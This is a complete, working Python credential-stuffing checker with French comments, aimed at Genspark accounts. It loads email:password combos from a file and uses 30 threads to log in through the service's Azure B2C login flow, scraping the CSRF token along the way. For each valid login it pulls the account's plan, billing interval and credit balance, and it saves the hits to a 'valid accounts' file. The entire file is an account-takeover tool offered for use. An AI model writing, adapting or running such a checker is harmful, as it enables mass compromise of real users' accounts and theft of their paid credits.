import requests
import re
import json
import os
import threading
from queue import Queue
from time import sleep

# --- VARIABLES DE CONFIGURATION ---
NUM_THREADS = 30
COMBO_FILE = "combo.txt"
VALID_ACCOUNTS_FILE = "comptes_valides.txt"
INVALID_ACCOUNTS_FILE = "comptes_invalides.txt"

# --- Définition des couleurs pour le terminal ---
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'

# Lock pour synchroniser l'accès aux fichiers et aux compteurs
file_lock = threading.Lock()
combo_queue = Queue()

# --- Compteurs pour le suivi de la progression ---
checked_count = 0
valid_count = 0
total_accounts = 0

# --- URLs des APIs Genspark ---
USER_URL    = "https://www.genspark.ai/api/user"
BALANCE_URL = "https://www.genspark.ai/api/payment/get_credit_balance"


def get_plan_and_balance(session):
    """
    Après une connexion réussie, appelle les deux APIs Genspark
    pour récupérer le plan et le solde de crédits.
    Retourne un dict: { 'plan': ..., 'interval': ..., 'balance': ... }
    """
    info = {'plan': 'N/A', 'interval': 'N/A', 'balance': 'N/A'}

    # --- 1. GET /api/user → plan + interval ---
    try:
        r = session.get(USER_URL, timeout=10)
        if r.status_code == 200:
            data = r.json()
            # Cherche dans la racine ou dans data{}
            plan = (
                data.get("personal_plan")
                or data.get("data", {}).get("personal_plan")
                or "N/A"
            )
            interval = (
                data.get("personal_paid_sub_interval")
                or data.get("data", {}).get("personal_paid_sub_interval")
                or "N/A"
            )
            info['plan']     = plan
            info['interval'] = interval
    except Exception:
        pass

    # --- 2. GET /api/payment/get_credit_balance → balance ---
    try:
        r = session.get(BALANCE_URL, timeout=10)
        if r.status_code == 200:
            data = r.json()
            # {"status":0,"message":"success","data":{"balance":9717,...}}
            balance = data.get("data", {}).get("balance")
            if balance is not None:
                info['balance'] = str(balance)
    except Exception:
        pass

    return info


def check_account(email, password):
    """
    Tente de se connecter via Azure B2C.
    Si succès, récupère plan + balance depuis les APIs Genspark.
    Retourne ('SUCCESS', session) ou ('CODE_ERREUR', None).
    """
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    })

    try:
        start_url = "https://login.genspark.ai/gensparkad.onmicrosoft.com/b2c_1_new_login/oauth2/v2.0/authorize?client_id=536a4e98-fd24-4cbc-a67b-417e209e0080&response_type=code&redirect_uri=https%3A%2F%2Fwww.genspark.ai%2Fapi%2Fauth&scope=email+offline_access+openid+profile&state=xpwmrIPnDhMBjJGO&code_challenge=fV3lU4JOuBYIqOZD-9fy0xvjjMvodCQG1IwZ1FrjFgo&code_challenge_method=S256&nonce=adb5015c40192345d6552754ba3a75adeefff70a6c9407554e91ee523d879d13&client_info=1&prompt=login"
        response = session.get(start_url, timeout=10)
        page_content = response.text

        settings_match = re.search(r'var SETTINGS = ({.*?});', page_content, re.DOTALL)
        if not settings_match:
            return 'ERROR_SETTINGS', None

        settings_data = json.loads(settings_match.group(1))
        csrf_token    = settings_data['csrf']
        transaction_id = settings_data['transId']

        login_post_url = "https://login.genspark.ai/gensparkad.onmicrosoft.com/B2C_1_new_login/SelfAsserted"
        query_params = {'tx': transaction_id, 'p': 'B2C_1_new_login'}
        payload = {'request_type': 'RESPONSE', 'email': email, 'password': password}
        post_headers = {
            'x-csrf-token': csrf_token,
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://login.genspark.ai',
            'Referer': response.url,
        }

        login_response = session.post(
            login_post_url,
            params=query_params,
            headers=post_headers,
            data=payload,
            timeout=10
        )

        if login_response.status_code == 200:
            data = login_response.json()
            if data.get("status") == "200":
                return 'SUCCESS', session          # session gardée avec les cookies
            elif data.get("status") == "400":
                message = data.get("message", "")
                if "Your password is incorrect" in message:
                    return 'WRONG_PASSWORD', None
                if "We can't seem to find your account" in message:
                    return 'ACCOUNT_NOT_FOUND', None
                return 'ERROR_API', None

        return 'ERROR_UNEXPECTED_RESPONSE', None

    except (requests.exceptions.RequestException, json.JSONDecodeError, KeyError):
        return 'ERROR_NETWORK_OR_PARSE', None


def worker():
    """Vérifie un compte, récupère plan + balance si valide, affiche le statut."""
    global checked_count, valid_count, total_accounts

    while not combo_queue.empty():
        line = combo_queue.get_nowait()
        line = line.strip()
        if not line or ':' not in line:
            combo_queue.task_done()
            continue

        email, password = line.split(':', 1)

        result_code, session = check_account(email, password)

        with file_lock:
            checked_count += 1

            if result_code == 'SUCCESS':
                valid_count += 1

                # --- Récupération du plan et du solde ---
                info = get_plan_and_balance(session)

                plan     = info['plan']
                interval = info['interval']
                balance  = info['balance']

                # Ligne sauvegardée dans le fichier valide
                save_line = (
                    f"{line} | "
                    f"Plan: {plan} | "
                    f"Interval: {interval} | "
                    f"Balance: {balance}"
                )
                with open(VALID_ACCOUNTS_FILE, 'a', encoding='utf-8') as f_out:
                    f_out.write(save_line + "\n")

                # Couleur selon le plan
                if plan in ('pro',):
                    plan_color = Colors.MAGENTA
                elif plan in ('plus',):
                    plan_color = Colors.GREEN
                else:
                    plan_color = Colors.YELLOW

                message = (
                    f"{Colors.GREEN}Compte Valide{Colors.RESET} | "
                    f"Plan: {plan_color}{plan.upper()}{Colors.RESET} | "
                    f"Interval: {Colors.CYAN}{interval}{Colors.RESET} | "
                    f"Balance: {Colors.CYAN}{balance} credits{Colors.RESET}"
                )

            else:
                if result_code == 'WRONG_PASSWORD':
                    error_msg = "Mot de passe incorrect"
                elif result_code == 'ACCOUNT_NOT_FOUND':
                    error_msg = "Compte introuvable"
                else:
                    error_msg = f"Erreur ({result_code})"

                message = f"{Colors.RED}{error_msg}{Colors.RESET}"
                with open(INVALID_ACCOUNTS_FILE, 'a', encoding='utf-8') as f_out:
                    f_out.write(line + "\n")

            # Ligne de statut
            status_line = f"[{checked_count}/{total_accounts}] [Valides: {valid_count}]"
            print(f"{status_line} {line}  ->  {message}")

        combo_queue.task_done()


# --- Point d'entrée principal du script ---
if __name__ == "__main__":
    if not os.path.exists(COMBO_FILE):
        print(f"{Colors.RED}ERREUR : Le fichier '{COMBO_FILE}' est introuvable.{Colors.RESET}")
        exit()

    open(VALID_ACCOUNTS_FILE, 'w').close()
    open(INVALID_ACCOUNTS_FILE, 'w').close()

    with open(COMBO_FILE, 'r', encoding='utf-8') as f:
        lines = [line.strip() for line in f if ':' in line.strip()]
        for line in lines:
            combo_queue.put(line)

    total_accounts = len(lines)

    if total_accounts == 0:
        print(f"{Colors.YELLOW}Le fichier '{COMBO_FILE}' est vide ou mal formaté.{Colors.RESET}")
        exit()

    print(f"--- Lancement de la vérification de {total_accounts} comptes avec {NUM_THREADS} threads ---")

    threads = []
    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=worker, daemon=True)
        thread.start()
        threads.append(thread)

    combo_queue.join()  # Attendre que tous les éléments de la file soient traités

    print(f"\n--- Vérification terminée ---")
    invalid_count = total_accounts - valid_count
    print(f"Résultats: {valid_count} valides, {invalid_count} invalides sur {total_accounts} comptes vérifiés.")
    print(f"{Colors.GREEN}Les comptes valides ont été sauvegardés dans '{VALID_ACCOUNTS_FILE}'.{Colors.RESET}")
    print(f"{Colors.RED}Les comptes invalides ont été sauvegardés dans '{INVALID_ACCOUNTS_FILE}'.{Colors.RESET}")
